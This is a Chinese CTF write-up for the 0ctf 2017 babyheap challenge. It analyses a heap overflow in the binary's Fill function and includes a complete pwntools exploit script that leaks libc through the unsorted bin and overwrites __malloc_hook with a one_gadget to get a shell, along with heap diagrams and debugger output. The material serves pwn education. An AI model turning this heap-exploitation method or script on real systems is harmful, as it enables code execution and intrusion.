# 0ctf-2017-babyheap

https://www.cnblogs.com/zhwer/p/13950309.html

## 静态分析
checksec 查看保护机制：
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
运行程序：
```
===== Baby Heap in 2017 =====
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command: 
```
典型的菜单题，几个功能分别是分配、填充、释放和输出

拖入 IDA 64bit 分析，具体函数对应反汇编代码如下：

### Allocate
```c
  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = readint();                       
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
```
v2 是人为输入需要分配的 chunk 大小，基地址在 a1 的索引结构体存放 chunk 信息
```c
struct chunk {
      long long is_used;
      long long size;
      long long *chunk_addr;
}
```
### Fill
```c
  printf("Index: ");
  result = readint();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = readint();
      v3 = result;
      if ( (signed int)result > 0 )
      {
        printf("Content: ");
        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
```
输入 chunk 的 index 并填充自定义长度的内容，存在堆溢出漏洞

### Free
```c
  printf("Index: ");
  result = readint();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      *(_DWORD *)(24LL * v2 + a1) = 0;
      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;
      free(*(void **)(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(_QWORD *)(result + 16) = 0LL;
    }
  }
```
释放堆块函数，输入 index 后判断了索引结构体的 is_used 是否为 1，若是则调用 free() 并清空结构体

### Dump
```c
  printf("Index: ");
  result = readint();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(_DWORD *)(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
      result = puts(byte_14F1);
    }
  }
```
输出堆块的内容，考虑可以泄露堆空间上的一些东西

## 解题思路
- 显式存在堆溢出漏洞，可以通过 chunk overlapping（堆块重叠） 构造出 fake chunk（伪堆块），绕过索引的清空

- 构造 unsorted bin 大小的伪堆块 2，释放后利用其上方的伪堆块 1 输出其 fd 指针指向的 libc 相关地址，泄露 libc 地址

- 在 libc 函数 __malloc_hook 上方构造 Fake Chunk，再次堆溢出覆写 hook 为 shellcode

## EXP
```python
from pwn import *
#io = process(['./babyheap_0ctf_2017'], env={"LD_PRELOAD":"./libc-2.23.so"})
io = remote('node3.buuoj.cn' ,'25071')
context.log_level = 'debug'
def debug():
    gdb.attach(io)
    pause();

def cmd(x):
    io.sendlineafter('Command: ', str(x))

def allocate(size):
    cmd(1)
    io.sendlineafter('Size: ', str(size))

def fill(index, content):
    cmd(2)
    io.sendlineafter('Index: ', str(index))
    io.sendlineafter('Size: ', str(len(content)))
    io.sendlineafter('Content: ',content)

def free(index):
    cmd(3)
    io.sendlineafter('Index: ',str(index))

def dump(index):
    cmd(4)
    io.sendlineafter('Index: ', str(index))

libc = ELF('./libc-2.23.so') 

allocate(0x10)
allocate(0x10)
allocate(0x30)
allocate(0x40)
allocate(0x60)
fill(0, p64(0x51)*4)
fill(2, p64(0x31)*6)
free(1)
allocate(0x40)
fill(1, p64(0x91)*4)
free(2)
dump(1)

io.recv(0x32)
main_arena = u64(io.recv(6).ljust(8, '\x00')) - 88
log.info('main_arena -> ' + hex(main_arena))
# cover __malloc_hook
malloc_hook = main_arena - 0x10
free(4)
payload = p64(0)*9 + p64(0x71) + p64(malloc_hook - 0x23)
# fake chunk3's pre_size is in ( malloc_hook - 0x23 )
log.info('fake chunk 3 -> ' + hex(malloc_hook - 0x23))
fill(3, payload)
allocate(0x60)
allocate(0x60)
libc_base = malloc_hook - libc.symbols['__malloc_hook']
# one_gadget ./libc-2.23.so
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget = p64(libc_base + 0x4526a)
payload = 'a'*0x13 + one_gadget
fill(4, payload)
allocate(1)
io.interactive()
```
## EXP 详细流程（图解）
（1）最后分配 0x70 的 chunk，是防止 Top Chunk 向前合并

由于 free() 会检查当前区块的 size 位后是否是一个区块的 size 位，所以结构要布置成这样

Top Chunk 合并 fastbin 规则

然后在下面分配 0x10、0x30、0x40、0x60 的堆块，情况如图：

```plaintext
addr           prev           size           status         fd             bk
0x55610baab000  0x0            0x20           Used           None           None
0x55610baab020  0x0            0x20           Used           None           None
0x55610baab040  0x0            0x40           Used           None           None
0x55610baab080  0x0            0x50           Used           None           None
0x55610baab0d0  0x0            0x70           Used           None           None
```

| Addr | content1 | content2  | Index  |
|------|----------|-----------|--------|
| 00   | |0x21  | idx0   |
| 10   | |      |        |
| 20   | |0x21  | idx1   |
| 30   | |      |        |
| 40   | |0x41  | idx2   |
| 50   | |      |        |
| 60   | |      |        |
| 70   | |      |        |
| 80   | |0x51  | idx3   |
| 90   | |      |        |
| A0   | |      |        |
| B0   | |      |        |
| C0   | |      |        |
| D0   | |0x71  | idx4   |
| E0   | |      |        |
| F0   | |      |        |
| 100  | |      |        |
| 110  | |      |        |
| 120  | |      |        |
| 130  | |      |        |
| 140  | |      | Top Chunk |

（图中未填充数值的即为 0x0）

| Addr | content1 | content2  | Index  |notes|
|------|----------|-----------|--------|-----|
| 00   | |0x21  | idx0   |
| 10   |0x51 |0x51      |        |
| 20   |0x51 |0x51  | idx1   |fakechunk
| 30   | |      |        |fakechunk
| 40   | |0x41  | idx2   |fakechunk
| 50   |0x31 |0x31      |        |fakechunk
| 60   |0x31 |0x31      |        |fakechunk
| 70   |0x31 |0x31      |        |fakechunk
| 80   | |0x51  | idx3   |
| 90   | |      |        |
| A0   | |      |        |
| B0   | |      |        |
| C0   | |      |        |
| D0   | |0x71  | idx4   |
| E0   | |      |        |
| F0   | |      |        |
| 100  | |      |        |
| 110  | |      |        |
| 120  | |      |        |
| 130  | |      |        |
| 140  | |      | Top Chunk |

| Addr | content1 | content2  | Index  |notes|
|------|----------|-----------|--------|-----|
| 00   | |0x21  | idx0   |
| 10   |0x51 |0x51      |        |
| 20   |0x51 |0x51  | idx1   |fakechunk
| 30   | |      |        |fakechunk(freed)
| 40   | |0x41  | idx2   |fakechunk
| 50   |0x31 |0x31      |        |fakechunk
| 60   |0x31 |0x31      |        |fakechunk
| 70   |0x31 |0x31      |        |fakechunk
| 80   | |0x51  | idx3   |
| 90   | |      |        |
| A0   | |      |        |
| B0   | |      |        |
| C0   | |      |        |
| D0   | |0x71  | idx4   |
| E0   | |      |        |
| F0   | |      |        |
| 100  | |      |        |
| 110  | |      |        |
| 120  | |      |        |
| 130  | |      |        |
| 140  | |      | Top Chunk |

填充后伪造出了 Fake Chunk 1 （idx1），将其释放后从 fastbin 0x50 中取出再分配

（此时索引结构体中记录该 chunk 的 size 已经是 0x40）

（使用 calloc 分配 chunk 会首先把 content 清零）

```
addr           prev           size           status         fd             bk
0x5603ede99000  0x0            0x20           Used           None           None
0x5603ede90a20  0x51           0x50           Used           None           None
0x5603ede90a70  0x31           0x30           Freed          0x0            0x51
Corrupt ?! (size == 0) (0x5603ede90a0)
```

| Addr | content1 | content2  | Index  |notes|
|------|----------|-----------|--------|-----|
| 00   | |0x21  | idx0   |
| 10   |0x51 |0x51      |        |
| 20   |0x51 |0x51  | idx1   |fakechunk
| 30   | |      |        |fakechunk
| 40   | |      | idx2   |fakechunk
| 50   |  |       |        |fakechunk
| 60   |  |       |        |fakechunk
| 70   |0x31 |0x31      |        |fakechunk
| 80   | |0x51  | idx3   |
| 90   | |      |        |
| A0   | |      |        |
| B0   | |      |        |
| C0   | |      |        |
| D0   | |0x71  | idx4   |
| E0   | |      |        |
| F0   | |      |        |
| 100  | |      |        |
| 110  | |      |        |
| 120  | |      |        |
| 130  | |      |        |
| 140  | |      | Top Chunk |


之后继续在 Fake Chunk 1 即 idx 除写入溢出数据，使其覆盖 chunk2 的 size 位为 0x91，伪造出 0x90 大小的 Fake Chunk 2

由于 0x90 已经超过 global_max_fast，所以 Fake Chunk 2 不会进入 fastbin 而是进入 unsortedbin 并且 fd 指向 main_arena + 88 的位置

UAF获取main_arena+88地址泄露libc基址

| Addr | content1 | content2  | Index  |notes|notes2
|------|----------|-----------|--------|-----|---
| 00   | |0x21  | idx0   |
| 10   |0x51 |0x51      |        |
| 20   |0x91 |0x91  | idx1   |fakechunk1
| 30   |0x91 |0x91      |        |fakechunk1
| 40   |0x91 |0x91      | idx2   |fakechunk1|fakechunk2
| 50   |  |       |        |fakechunk1|freed
| 60   |  |       |        |fakechunk1|unsortedbin 
| 70   |0x31 |0x31      |        |fakechunk1|pointer->
| 80   | |0x51  | idx3   | |mainarena+88
| 90   | |      |        | |fakechunk2
| A0   | |      |        | |fakechunk2
| B0   | |      |        | |fakechunk2
| C0   | |      |        | |fakechunk2
| D0   | |0x71  | idx4   |
| E0   | |      |        |
| F0   | |      |        |
| 100  | |      |        |
| 110  | |      |        |
| 120  | |      |        |
| 130  | |      |        |
| 140  | |      | Top Chunk |

```
gdb-peda$ bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x55860a7a30d0 -> 0x7f4263cf0aeb (_IO_wide_data_0+299) <- 0x9b1ea00000000000
unsortedbin
all: 0x55860a7a3040 -> 0x7f4263cf0b78 (main_arena+88) <- 0x55860a73040
smallbins
empty
largebins
```

虽然索引结构体中的 Fake Chunk 2 地址已经无法获取，

但是我们可以通过正在使用的 Fake Chunk 1 打印出 Chunk 2 的 fd

由于 main_arena 是 libc 装载在内存中的，或者其内存地址后，

我们可以通过计算偏移得到 libc 的装载地址

计算输出有效偏移需要动态调试：
```
[DEBUG] Received 0x80 bytes:
00000000  43 6f 6e 74 65 6e 74 3a  20 0a 91 00 00 00 00 00   |Content: .. ..|
00000010  00 00 91 00 00 00 00 00  00 00 91 00 00 00 00 00   |.. .. .. .. .. ..|
00000020  00 00 91 00 00 00 00 00  00 00 78 2b 7b 0a a6 7f   |.x+{...|
00000030  00 00 78 2b 7b 0a a6 7f  00 00 00 00 00 00 00 00   |.x+{.....|
00000040  00 00 00 00 00 00 00 00  00 00 00 31 2e 20 41 6c   |... A.|
```

接受了该地址后即可通过偏移计算出 main_arean 以及其他 libc 符号的装载地址

通过调试：malloc_hook = main_arena - 0x10

再往前找发现能在 malloc_hook - 0x23 的地方凑出 size = 0x70 的 chunk 头，size 位为 p64(0x7f)

以这里为 chunk 头，可以通过 malloc 的验证（详细验证方法需要查阅 glibc 源码）

并且下一步堆溢出可以覆写 __malloc_hook 成 one_gagdet

malloc hook初探

```
gdb-peda$ x/10 0x7f3b921ffb10 - 0x23
0x7f3b921ffaed:   0x00000000000007f    0x03b91fe260000000
0x7f3b921ffafd:   0x03b91ec0e2000000    0x03b91ec0a000007f
0x7f3b921ffafd:   <__realloc_hook+5>:  0x000000000000007f    0x0000000000000000
0x7f3b921ffb0d:   0x0000000000000000    0x0000000000000000
0x7f3b921ffb1d:   0x0000000000000000    0x0000000000000000
0x7f3b921ffb2d:   0x0000000000000000    0x0000000000000000
```

下一次 allcoate 的时候，将会执行 shellcode 从而 GETSHELL

```
$ cat flag
[DEBUG] Sent 0x9 bytes:
'cat flag\n'
[DEBUG] Received 0x2b bytes:
'flag{a975424a-726c-4007-aca7-3231c0dd1902}\n'
flag{a975424a-726c-4007-aca7-3231c0dd1902}
```